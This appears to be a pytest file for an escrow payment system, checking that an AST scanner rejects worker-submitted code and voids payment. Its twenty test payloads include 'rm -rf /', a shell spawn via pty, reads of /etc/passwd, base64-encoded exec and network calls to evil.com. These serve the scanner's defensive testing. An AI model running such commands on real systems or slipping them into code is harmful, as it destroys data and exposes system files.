"""
tests/test_ast_security_matrix.py
20-Vector AST Malicious Code Injection Test Matrix for AegisPay.

Mathematically proves the AST Hard Veto Invariant (Invariant #5):
For any malicious payload in the 20-vector attack matrix:
1. The AST scanner detects the security perimeter violation.
2. S_ast is forced to 0.00 (locking total composite score S = 0.00).
3. PayPal authorization is immediately voided.
4. FSM state transitions to ESCROW_VOIDED_REFUNDED with zero dollars captured ($0.00).
"""

from datetime import datetime, timezone
import pytest

from backend.app.config import Settings
from backend.app.schemas import FsmState
from backend.app.services.arbitration_engine import (
    ArbitrationArbiter,
    AstSecurityScanner,
)
from backend.app.services.fsm import ContractRecord
from backend.app.services.ledger_service import DoubleEntryLedgerEngine
from backend.app.services.orchestrator import EscrowOrchestrator
from backend.app.services.paypal_mock import MockPayPalEscrowEngine
from backend.app.db import Repository


PAYLOADS_20_VECTORS = [
    # Vector 1: Direct OS system shell command
    ("vector_01_os_system", "import os\nos.system('rm -rf /')"),
    # Vector 2: Subprocess execution
    ("vector_02_subprocess_popen", "import subprocess\nsubprocess.Popen(['curl', 'evil.com'])"),
    # Vector 3: Socket network socket creation
    ("vector_03_socket_connect", "import socket\ns = socket.socket()"),
    # Vector 4: Sys exit interruption
    ("vector_04_sys_exit", "import sys\nsys.exit(1)"),
    # Vector 5: Obfuscated __import__ call
    ("vector_05_obfuscated_import", "__import__('os').system('ls')"),
    # Vector 6: Built-in reflection via getattr
    ("vector_06_getattr_builtins", "getattr(__builtins__, 'ev' + 'al')('1+1')"),
    # Vector 7: Base64 dynamic exec
    ("vector_07_dynamic_exec", "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))"),
    # Vector 8: Forbidden built-in: compile()
    ("vector_08_compile_builtin", "c = compile('1+1', '<string>', 'eval')"),
    # Vector 9: Forbidden built-in: globals() manipulation
    ("vector_09_globals_builtin", "g = globals()\ng['__builtins__']"),
    # Vector 10: Forbidden built-in: open('/etc/passwd')
    ("vector_10_open_system_passwd", "f = open('/etc/passwd')\ndata = f.read()"),
    # Vector 11: File descriptor tampering via io module
    ("vector_11_io_tampering", "import io\nf = io.FileIO('/dev/null')"),
    # Vector 12: Low-level threading exploits
    ("vector_12_thread_exploit", "import _thread\n_thread.start_new_thread(lambda: None, ())"),
    # Vector 13: Ctypes memory manipulation
    ("vector_13_ctypes_cdll", "import ctypes\nctypes.CDLL(None)"),
    # Vector 14: Pseudo-terminal spawn attack
    ("vector_14_pty_spawn", "import pty\npty.spawn('/bin/sh')"),
    # Vector 15: Shell lexer command injection
    ("vector_15_shlex_split", "import shlex\nargs = shlex.split('curl evil.com')"),
    # Vector 16: File system destruction via shutil
    ("vector_16_shutil_rmtree", "import shutil\nshutil.rmtree('/tmp')"),
    # Vector 17: Network egress via urllib
    ("vector_17_urllib_egress", "import urllib.request\nurllib.request.urlopen('http://evil.com')"),
    # Vector 18: Network egress via requests
    ("vector_18_requests_egress", "import requests\nrequests.get('http://evil.com')"),
    # Vector 19: High-level threading spawning
    ("vector_19_threading_spawn", "import threading\nt = threading.Thread(target=lambda: None)\nt.start()"),
    # Vector 20: Multiprocessing fork attack
    ("vector_20_multiprocessing_fork", "import multiprocessing\np = multiprocessing.Process(target=lambda: None)\np.start()"),
]

BUYER_TEST_SUITE = """
def test_placeholder():
    assert True
"""


@pytest.mark.parametrize("vector_name,payload", PAYLOADS_20_VECTORS)
def test_ast_scanner_catches_all_20_vectors(vector_name: str, payload: str):
    """
    Asserts that the static AST security scanner flags all 20 malicious vectors
    and returns is_safe == False with at least one recorded violation.
    """
    scanner = AstSecurityScanner()
    is_safe, violations = scanner.scan(payload)

    assert is_safe is False, f"Failed to detect violation for {vector_name}"
    assert len(violations) >= 1, f"No violations logged for {vector_name}"


@pytest.mark.parametrize("vector_name,payload", PAYLOADS_20_VECTORS)
def test_arbiter_enforces_ast_hard_veto_across_20_vectors(vector_name: str, payload: str):
    """
    Asserts that the Verification Arbiter forces S_ast = 0.00 and composite S = 0.00,
    with VOID_AUTHORIZATION settlement split and $0 captured across all 20 vectors.
    """
    arbiter = ArbitrationArbiter()
    report = arbiter.evaluate(
        agreement_id=f"agr_{vector_name}",
        worker_code=payload,
        buyer_test_code=BUYER_TEST_SUITE,
        budget_micros=15_000_000,
    )

    assert report.ast_safe is False
    assert report.s_ast == 0.0, f"S_ast was not zeroed for {vector_name}"
    assert report.composite_score == 0.0, f"Composite score was not locked to 0.00 for {vector_name}"
    assert report.settlement.decision == "VOID_AUTHORIZATION"
    assert report.settlement.capture_micros == 0
    assert report.settlement.buyer_released_micros == 15_000_000
    assert report.settlement.worker_net_payout_micros == 0


@pytest.mark.asyncio
@pytest.mark.parametrize("vector_name,payload", PAYLOADS_20_VECTORS)
async def test_orchestrator_voids_authorization_and_refunds_escrow(
    tmp_path, vector_name: str, payload: str
):
    """
    Mathematically verifies full end-to-end invariant:
    1. Worker delivers malicious payload.
    2. Arbiter flags security violation.
    3. PayPal authorization is immediately voided.
    4. State transitions to ESCROW_VOIDED_REFUNDED with zero dollars captured.
    5. Buyer vault retains full $15.00 budget.
    """
    db_path = f"sqlite:///{tmp_path}/{vector_name}.db"
    repo = Repository.from_url(db_path)
    ledger = DoubleEntryLedgerEngine(repository=repo)
    engine = MockPayPalEscrowEngine()
    settings = Settings(_env_file=None, PAYPAL_MODE="mock")
    orch = EscrowOrchestrator(
        repo=repo,
        ledger=ledger,
        engine=engine,
        arbiter=ArbitrationArbiter(),
        settings=settings,
    )

    agreement_id = f"agr_{vector_name}"
    now = datetime.now(timezone.utc)

    # Seed contract in PAYPAL_AUTH_LOCKED state
    contract = ContractRecord(
        agreement_id=agreement_id,
        buyer_agent_id="buyer_did_01",
        worker_agent_id="worker_did_02",
        worker_paypal_email="worker@example.com",
        budget_micros=15_000_000,
        task_description="Build secure component",
        timeout_seconds=3600,
        fsm_state=FsmState.PAYPAL_AUTH_LOCKED,
        paypal_authorization_id=f"AUTH_{vector_name}",
        authorized_at=now,
        created_at=now,
        updated_at=now,
    )
    repo.save_contract(contract)

    # Setup ledger hold balances
    ledger.deposit("buyer_vault", 15_000_000, agreement_id, "initial deposit")
    ledger.record_transfer("paypal_escrow_hold", "buyer_vault", 15_000_000, agreement_id, "hold lock")

    # Worker submits malicious code
    c = await orch.submit_work(
        agreement_id=agreement_id,
        source_code=payload,
        test_suite=BUYER_TEST_SUITE,
    )

    # Assert Invariant #5:
    assert c.fsm_state == FsmState.ESCROW_VOIDED_REFUNDED, (
        f"{vector_name} failed to transition to ESCROW_VOIDED_REFUNDED (current: {c.fsm_state})"
    )
    assert c.paypal_capture_id is None
    assert c.verification_score == 0.0

    # Verify authorization void transition occurred
    assert any(
        t.to_state == FsmState.ESCROW_VOIDED_REFUNDED for t in c.transitions
    )

    # Verify ledger journal balances: 0 capture, 100% released back to buyer vault
    balances = ledger.get_all_balances()
    assert balances.get("paypal_escrow_hold", 0) == 0
    assert balances.get("buyer_vault", 0) == 15_000_000
    assert balances.get("worker_payable", 0) == 0
